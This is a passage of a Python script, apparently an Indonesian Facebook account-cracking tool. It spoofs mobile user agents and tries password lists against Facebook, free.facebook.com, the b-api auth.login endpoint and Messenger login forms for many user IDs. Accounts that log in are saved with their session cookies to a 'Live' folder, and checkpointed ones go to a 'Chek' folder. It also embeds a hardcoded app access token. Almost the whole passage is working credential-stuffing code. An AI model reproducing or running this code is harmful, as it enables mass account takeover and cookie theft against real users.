	BB = f"Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S8500/S8500JPLC2; U; Bada/2.0; en-us) AppleWebKit/534.20 (KHTML, like Gecko) Dolfin/{str(rr(1,9))}.0 Mobile WVGA SMM-MMS/1.2.0 OPN-B"
	CC = f"Mozilla/5.0 (Linux; Android 13; motorola edge plus 2023 Build/T1TR33.43-48-35; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,105))}.0.{str(rr(1111,4444))}.{str(rr(45,250))} Mobile Safari/537.36 EdgW/1.0"
	DD = f"Mozilla/5.0 (Linux; Android 13 QPR5; SM-S918U1) AppleWebKit/606.2.15 (KHTML, like Gecko) Brave/{str(rr(50,105))}.0.{str(rr(1111,4444))}.{str(rr(45,250))} Mobile Safari/606.2.15"
	EE = f"Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro Build/TQ3A.230805.001.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Brave/{str(rr(50,105))}.0.{str(rr(1111,4444))}.{str(rr(45,250))} Mobile Safari/537.36"
	KK = f"Mozilla/5.0 (Linux; Android 10; 801FJ Build/V48R056B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,105))}.0.{str(rr(1111,4444))}.{str(rr(45,250))} Mobile Safari/537.36 YJApp-ANDROID jp.co.yahoo.android.ybrowser/3.28.0.3"
	return rc([AA])
	
def generateuseragentdalvik():
	rr = random.randint
	rc = random.choice
	versi = random.choice(['8','9','10','11','12','13'])
	versi_apk = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
	versi_app = random.randint(410000000,499999999)
	simcard = random.choice(["INDOSAT","Indosat Ooredoo"])
	model = random.choice(["Infinix X692 Build/QP1A.190711.020"])
	#    density = "{density=2.25,height="+subprocess.check_output("getprop ro.hwui.text_large_cache_height",shell=True).decode("utf-8").replace("\n","")+",width="+subprocess.check_output("getprop ro.hwui.text_large_cache_width",shell=True).decode("utf-8").replace("\n","")+"}"
	return (f"Dalvik/2.1.0 (Linux; U; Android {versi}) {model}) [FBAN/Orca-Android;FBAV/{versi_apk};FBPN/com.facebook.orca;FBLC/in_ID;FBBV/{versi_app};FBCR/Indosat Ooredoo;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X692;FBSV/{versi};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1464};FB_FW/1;] FBBK/1")
###-----[ METODE VALIDATE ]-----###
def _validate_(uid,pasw):
	global loop,ok,cp
	sys.stdout.write(f"\r{P}  - {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}"),
	sys.stdout.flush()
	ses = requests.Session()
	for pw in pasw:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else:ua = generateuseragentdalvik()
			head = {"Host": "free.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt": "1","x-requested-with": "mark.via.gp","sec-fetch-site": "none","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://free.facebook.com/","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			link = ses.get("https://free.facebook.com/login/device-based/password/?uid="+uid+"&flow=login_no_pin&next=%2Fcreatorstudio%2F%3Freference%3Dvisit_from_seo&refsrc=deprecated&_rdr",headers=head)
			data = {"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"uid": uid,"next": "https://free.facebook.com/login/save-device/","flow": "login_no_pin","pass":pw}
			headd = {"Host": "free.facebook.com","content-length": "338","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://free.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://free.facebook.com/login/device-based/password/?uid="+uid+"&flow=login_no_pin&next=%2Fcreatorstudio%2F%3Freference%3Dvisit_from_seo&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			post = ses.post("https://free.facebook.com/login/device-based/validate-password/?shbl=0",data=data,headers=headd,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"\r{H}  - {H}{uid}|{pw} ---> OK{P}")
				print(f"\r{H}  - {H}{kuki};ua={ua}{P}")
				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}|{ua}\n")
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				print(f"\r{K}  - {K}{uid}|{pw} ---> CP{P}")
				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1
###-----[ METODE ASYNC ]-----###
def _async_(uid,pasw):
	global loop,ok,cp
	sys.stdout.write(f"\r{P}  - {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}"),
	sys.stdout.flush()
	ses = requests.Session()
	for pw in pasw:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else:ua = ua_valid()
			link = ses.get("https://x.facebook.com/login.php?skip__api__login=1&_api__key=322935469656730&kid_directed_site=0&app_id=322935469656730&signed_next=1&next=https%3A%2F%2Fx.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATCq9NsxS6sW6h_mdyIASwcNypRJoixGYoe_VqnqAJHJ16EX4vAltQLbDHKrr7axWApCEnlw4xSOYXBFDn6-d0e-pyI3uguSuMj1HQDeXSPHD3J6_88f1ftdRaJpm-tw240WmG-2sAtnYrcawBBc_yaS3nJlz_otw-2Yf7xnIganSKcbeBpcHstwbv5WP1OwridjM6oQbZxfqVMWQ2Dmn3eBV1E8aHCxQ1JvRB1Fjd8DcymER_Rryt1J3b-N7ZvG_LsXZo_cNMo3dnBJhQ_MSF-XRWtBPIeM9EnOw-aht-hV_mEzUIb5yrAX6r3JuMbIuLn0Rw7Qms44lun7bI7DvJ7fNGpWuFel4gYi-wTB7a6gYzBAIj0C5hi8f1DhLEZa3lygH_sNoEcHLeSw7TssdfZPd_YjnzdLQiIDfhXlDSlZEtDwXbODtTOya9Cuiprf9sj_Hv6du_3G8u2NBCgZkPFHYSQjolPj4TZd6qySf4l32iSwIXu3KY6jIh_ngAJQNKnVs3tKlNEKvIPgYzzfPI18_BQ09z1IsoJT0i81XH9-Vuht8PHjQsRfL2ONTorAqwhRqEuNtK8OHmQjcTZ-t-ERkb9zvjfAmMnYfgjFf1x_2BAMcRgpOEtakCMFKHWm0Jlq48UQtKh1am_7O_4UaV_-5x744L5EUB_OvjiHDr4pHxzjGp4mqkAHOhZ8rsG79f7LHgtoF73JLeuxsFWUyJtTAXwcmA%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da541f38b-8a62-4d55-b89b-1950c720d594%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATCq9NsxS6sW6h_mdyIASwcNypRJoixGYoe_VqnqAJHJ16EX4vAltQLbDHKrr7axWApCEnlw4xSOYXBFDn6-d0e-pyI3uguSuMj1HQDeXSPHD3J6_88f1ftdRaJpm-tw240WmG-2sAtnYrcawBBc_yaS3nJlz_otw-2Yf7xnIganSKcbeBpcHstwbv5WP1OwridjM6oQbZxfqVMWQ2Dmn3eBV1E8aHCxQ1JvRB1Fjd8DcymER_Rryt1J3b-N7ZvG_LsXZo_cNMo3dnBJhQ_MSF-XRWtBPIeM9EnOw-aht-hV_mEzUIb5yrAX6r3JuMbIuLn0Rw7Qms44lun7bI7DvJ7fNGpWuFel4gYi-wTB7a6gYzBAIj0C5hi8f1DhLEZa3lygH_sNoEcHLeSw7TssdfZPd_YjnzdLQiIDfhXlDSlZEtDwXbODtTOya9Cuiprf9sj_Hv6du_3G8u2NBCgZkPFHYSQjolPj4TZd6qySf4l32iSwIXu3KY6jIh_ngAJQNKnVs3tKlNEKvIPgYzzfPI18_BQ09z1IsoJT0i81XH9-Vuht8PHjQsRfL2ONTorAqwhRqEuNtK8OHmQjcTZ-t-ERkb9zvjfAmMnYfgjFf1x_2BAMcRgpOEtakCMFKHWm0Jlq48UQtKh1am_7O_4UaV_-5x744L5EUB_OvjiHDr4pHxzjGp4mqkAHOhZ8rsG79f7LHgtoF73JLeuxsFWUyJtTAXwcmA%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			data = {
			   "m_ts": re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
			   "li": re.search('name="li" value="(.*?)"',str(link.text)).group(1),
			   "try_number": re.search('name="try_number" value="(.*?)" data-sigil="(.*?)"',str(link.text)).group(1),
			   "unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)" data-sigil="(.*?)"',str(link.text)).group(1),
			   "email": uid,
			   "prefill_contact_point": "",
			   "prefill_source": "",
			   "prefill_type": "",
			   "first_prefill_source": "",
			   "first_prefill_type": "",
			   "had_cp_prefilled": "false",
			   "had_password_prefilled": "true",
			   "is_smart_lock": "true",
			   "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1),
			   "pass": pw,
			   "fb_dtsg": "",
			   "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
			   "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
			   "__dyn": "",
			   "__csr": "",
			   "__req":"",
			   "__a": "",
			   "user": "0"}
			headd = {
			   "Host": "x.facebook.com",
			   "Connection": "keep-alive",
			   "Content-Length": "2148",
			   "sec-ch-ua": '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
			   "sec-ch-ua-mobile": "?0",
			   "User-Agent": ua,
			   "viewport-width": "980",
			   "Content-Type": "application/x-www-form-urlencoded",
			   "X-FB-LSD": re.search('name="lsd" value="(.*?)" autocomplete="(.*?)"',str(link.text)).group(1),
			   "sec-ch-ua-platform-version": '""',
			   "X-ASBD-ID": "129477",
			   "dpr": "2.56875",
			   "sec-ch-ua-full-version-list": '"Chromium";v="116.0.5845.114", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="116.0.5845.114"',
			   "sec-ch-ua-model": '""',
			   "sec-ch-prefers-color-scheme": "dark",
			   "sec-ch-ua-platform": '"Linux"',
			   "Accept": "*/*",
			   "Origin": "https://x.facebook.com",
			   "Sec-Fetch-Site": "same-origin",
			   "Sec-Fetch-Mode": "cors",
			   "Sec-Fetch-Dest": "empty",
			   "Referer": "https://x.facebook.com/login.php?skip__api__login=1&_api__key=322935469656730&kid_directed_site=0&app_id=322935469656730&signed_next=1&next=https%3A%2F%2Fx.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATCq9NsxS6sW6h_mdyIASwcNypRJoixGYoe_VqnqAJHJ16EX4vAltQLbDHKrr7axWApCEnlw4xSOYXBFDn6-d0e-pyI3uguSuMj1HQDeXSPHD3J6_88f1ftdRaJpm-tw240WmG-2sAtnYrcawBBc_yaS3nJlz_otw-2Yf7xnIganSKcbeBpcHstwbv5WP1OwridjM6oQbZxfqVMWQ2Dmn3eBV1E8aHCxQ1JvRB1Fjd8DcymER_Rryt1J3b-N7ZvG_LsXZo_cNMo3dnBJhQ_MSF-XRWtBPIeM9EnOw-aht-hV_mEzUIb5yrAX6r3JuMbIuLn0Rw7Qms44lun7bI7DvJ7fNGpWuFel4gYi-wTB7a6gYzBAIj0C5hi8f1DhLEZa3lygH_sNoEcHLeSw7TssdfZPd_YjnzdLQiIDfhXlDSlZEtDwXbODtTOya9Cuiprf9sj_Hv6du_3G8u2NBCgZkPFHYSQjolPj4TZd6qySf4l32iSwIXu3KY6jIh_ngAJQNKnVs3tKlNEKvIPgYzzfPI18_BQ09z1IsoJT0i81XH9-Vuht8PHjQsRfL2ONTorAqwhRqEuNtK8OHmQjcTZ-t-ERkb9zvjfAmMnYfgjFf1x_2BAMcRgpOEtakCMFKHWm0Jlq48UQtKh1am_7O_4UaV_-5x744L5EUB_OvjiHDr4pHxzjGp4mqkAHOhZ8rsG79f7LHgtoF73JLeuxsFWUyJtTAXwcmA%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da541f38b-8a62-4d55-b89b-1950c720d594%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATCq9NsxS6sW6h_mdyIASwcNypRJoixGYoe_VqnqAJHJ16EX4vAltQLbDHKrr7axWApCEnlw4xSOYXBFDn6-d0e-pyI3uguSuMj1HQDeXSPHD3J6_88f1ftdRaJpm-tw240WmG-2sAtnYrcawBBc_yaS3nJlz_otw-2Yf7xnIganSKcbeBpcHstwbv5WP1OwridjM6oQbZxfqVMWQ2Dmn3eBV1E8aHCxQ1JvRB1Fjd8DcymER_Rryt1J3b-N7ZvG_LsXZo_cNMo3dnBJhQ_MSF-XRWtBPIeM9EnOw-aht-hV_mEzUIb5yrAX6r3JuMbIuLn0Rw7Qms44lun7bI7DvJ7fNGpWuFel4gYi-wTB7a6gYzBAIj0C5hi8f1DhLEZa3lygH_sNoEcHLeSw7TssdfZPd_YjnzdLQiIDfhXlDSlZEtDwXbODtTOya9Cuiprf9sj_Hv6du_3G8u2NBCgZkPFHYSQjolPj4TZd6qySf4l32iSwIXu3KY6jIh_ngAJQNKnVs3tKlNEKvIPgYzzfPI18_BQ09z1IsoJT0i81XH9-Vuht8PHjQsRfL2ONTorAqwhRqEuNtK8OHmQjcTZ-t-ERkb9zvjfAmMnYfgjFf1x_2BAMcRgpOEtakCMFKHWm0Jlq48UQtKh1am_7O_4UaV_-5x744L5EUB_OvjiHDr4pHxzjGp4mqkAHOhZ8rsG79f7LHgtoF73JLeuxsFWUyJtTAXwcmA%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
			   "Accept-Encoding": "gzip, deflate, br",
			   "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			post = ses.post("https://x.facebook.com/login/device-based/login/async/?_api__key=322935469656730&auth_token=6bfab1e8f2050adecc16804d02dd7f10&skip__api__login=1&signed_next=1&next=https%3A%2F%2Fx.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATCq9NsxS6sW6h_mdyIASwcNypRJoixGYoe_VqnqAJHJ16EX4vAltQLbDHKrr7axWApCEnlw4xSOYXBFDn6-d0e-pyI3uguSuMj1HQDeXSPHD3J6_88f1ftdRaJpm-tw240WmG-2sAtnYrcawBBc_yaS3nJlz_otw-2Yf7xnIganSKcbeBpcHstwbv5WP1OwridjM6oQbZxfqVMWQ2Dmn3eBV1E8aHCxQ1JvRB1Fjd8DcymER_Rryt1J3b-N7ZvG_LsXZo_cNMo3dnBJhQ_MSF-XRWtBPIeM9EnOw-aht-hV_mEzUIb5yrAX6r3JuMbIuLn0Rw7Qms44lun7bI7DvJ7fNGpWuFel4gYi-wTB7a6gYzBAIj0C5hi8f1DhLEZa3lygH_sNoEcHLeSw7TssdfZPd_YjnzdLQiIDfhXlDSlZEtDwXbODtTOya9Cuiprf9sj_Hv6du_3G8u2NBCgZkPFHYSQjolPj4TZd6qySf4l32iSwIXu3KY6jIh_ngAJQNKnVs3tKlNEKvIPgYzzfPI18_BQ09z1IsoJT0i81XH9-Vuht8PHjQsRfL2ONTorAqwhRqEuNtK8OHmQjcTZ-t-ERkb9zvjfAmMnYfgjFf1x_2BAMcRgpOEtakCMFKHWm0Jlq48UQtKh1am_7O_4UaV_-5x744L5EUB_OvjiHDr4pHxzjGp4mqkAHOhZ8rsG79f7LHgtoF73JLeuxsFWUyJtTAXwcmA%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da541f38b-8a62-4d55-b89b-1950c720d594%26tp%3Dunspecified&refsrc=deprecated&app_id=322935469656730&cancel=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATCq9NsxS6sW6h_mdyIASwcNypRJoixGYoe_VqnqAJHJ16EX4vAltQLbDHKrr7axWApCEnlw4xSOYXBFDn6-d0e-pyI3uguSuMj1HQDeXSPHD3J6_88f1ftdRaJpm-tw240WmG-2sAtnYrcawBBc_yaS3nJlz_otw-2Yf7xnIganSKcbeBpcHstwbv5WP1OwridjM6oQbZxfqVMWQ2Dmn3eBV1E8aHCxQ1JvRB1Fjd8DcymER_Rryt1J3b-N7ZvG_LsXZo_cNMo3dnBJhQ_MSF-XRWtBPIeM9EnOw-aht-hV_mEzUIb5yrAX6r3JuMbIuLn0Rw7Qms44lun7bI7DvJ7fNGpWuFel4gYi-wTB7a6gYzBAIj0C5hi8f1DhLEZa3lygH_sNoEcHLeSw7TssdfZPd_YjnzdLQiIDfhXlDSlZEtDwXbODtTOya9Cuiprf9sj_Hv6du_3G8u2NBCgZkPFHYSQjolPj4TZd6qySf4l32iSwIXu3KY6jIh_ngAJQNKnVs3tKlNEKvIPgYzzfPI18_BQ09z1IsoJT0i81XH9-Vuht8PHjQsRfL2ONTorAqwhRqEuNtK8OHmQjcTZ-t-ERkb9zvjfAmMnYfgjFf1x_2BAMcRgpOEtakCMFKHWm0Jlq48UQtKh1am_7O_4UaV_-5x744L5EUB_OvjiHDr4pHxzjGp4mqkAHOhZ8rsG79f7LHgtoF73JLeuxsFWUyJtTAXwcmA%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&lwv=100", data=data,headers={"User-Agent":ua},allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"\r{H}  - {H}{uid}|{pw} ---> OK{P}")
				print(f"\r{H}  - {H}{kuki}{P}")
				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}|{ua}\n")
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				print(f"\r{K}  - {K}{uid}|{pw} ---> CP{P}")
				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1
###-----[ METODE API ]-----###
def _api_(uid,pasw):
	global loop,ok,cp
	sys.stdout.write(f"\r{P}  - {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}"),
	sys.stdout.flush()
	ses = requests.Session()
	for pw in pasw:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else:ua = palkon()
			headers_ = {"x-fb-connection-bandwidth": str(rr(20000000.0, 30000000.0)), "x-fb-sim-hni": str(rr(20000, 40000)), "x-fb-net-hni": str(rr(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': str(rr(2,31)), 'email': uid, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': f'{random.randrange(1, 9)}f{random.randrange(100, 999)}f{random.randrange(10, 99)}fb{random.randrange(10, 99)}fcd{random.randrange(1, 9)}aa{random.randrange(0, 9)}c{random.randrange(10, 99)}f{random.randrange(10, 99)}f{random.randrange(100, 999)}ef{random.randrange(1, 9)}'}
			response = ses.get('https://b-api.facebook.com/method/auth.login', params=params, headers=headers_)
			xxx = json.loads(response.text)
			if 'access_token' in response.text and 'EAAA' in response.text:
				ok+=1
				coki = xxx["session_cookies"]
				cok = {}
				for x in coki:
					cok.update({x["name"]:x["value"]})
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
				print(f"\r{H}  - {H}{uid}|{pw} ---> OK{P}")
				print(f"\r{H}  - {H}{kuki}{P}")
				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
				break
			elif 'www.facebook.com' in response.json()['error_msg']:
				cp+=1
				print(f"\r{K}  - {K}{uid}|{pw} ---> CP{P}")
				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1
###-----[ METODE MESSENGER ]-----###
def _messenger_(uid,pasw):
	global loop,ok,cp
	sys.stdout.write(f"\r{P}  - {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}"),
	sys.stdout.flush()
	ses = requests.Session()
	while True:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else:ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36"
			headers = {
             "Host": "www.messenger.com",
             "Connection": "keep-alive",
             "Content-Length": "267",
             "Cache-Control": "max-age=0",
             "sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
             "sec-ch-ua-mobile": "?0",
             "sec-ch-ua-platform": '"Linux"',
             "Upgrade-Insecure-Requests": "1",
             "Origin": "https://www.messenger.com",
             "Content-Type": "application/x-www-form-urlencoded",
             "User-Agent": ua,
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
             "Sec-Fetch-Site": "same-origin",
             "Sec-Fetch-Mode": "navigate",
             "Sec-Fetch-User": "?1",
             "Sec-Fetch-Dest": "document",
             "Referer": "https://www.messenger.com/",
             "Accept-Encoding": "gzip, deflate, br",
             "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5",
			}
			reqs = ses.get("https://www.messenger.com/").text
			datr = re.search('_js_datr","(.*?)",', str(reqs)).group(1)
			data = {
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(reqs)).group(1),
             "lsd":re.search('name="lsd" value="(.*?)"', str(reqs)).group(1),
             "initial_request_id":re.search('name="initial_request_id" value="(.*?)"', str(reqs)).group(1),
             "timezone":"-420",
             "lgndim":re.search('name="lgndim" value="(.*?)"', str(reqs)).group(1),
             "lgnrnd":re.search('name="lgnrnd" value="(.*?)"', str(reqs)).group(1),
             "lgnjs":"n",
             "email":uid,
             "pass":"Sungkem Puh Sepuhh",
             "login":"1",
             "persistent":"1",
             "default_persistent":""
			}
			headers.update({"Cookie":f"wd=980x1715; dpr=2; _js_datr={datr}"})
			break
		except:pass
	for pw in pasw:
		try:
			data.update({"pass":"".join(pw)})
			response = ses.post("https://www.messenger.com/login/password/", data=data, headers=headers, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				kuki = (';').join(["%s=%s"%(name,value) for name,value in ses.cookies.get_dict().items()]) + headers.get('Cookie').replace(' ','')
				print(f"\r{H}  - {H}{uid}|{pw} ---> OK{P}")
				print(f"\r{H}  - {H}{kuki}{P}")
				ok +=1
				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
				break
			elif "www.facebook.com%2Fcheckpoint" in response.headers.get('Location'):
				print(f"\r{K}  - {K}{uid}|{pw} ---> CP{P}")
				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
				cp+=1
				break
			else:continue
		except (requests.exceptions.ConnectionError):
			time.sleep(15)
		except:pass
	loop+=1
        
if __name__=='__main__':
	try:os.mkdir('Live')
	except:pass
	try:os.mkdir('Chek')
	except:pass
	menu()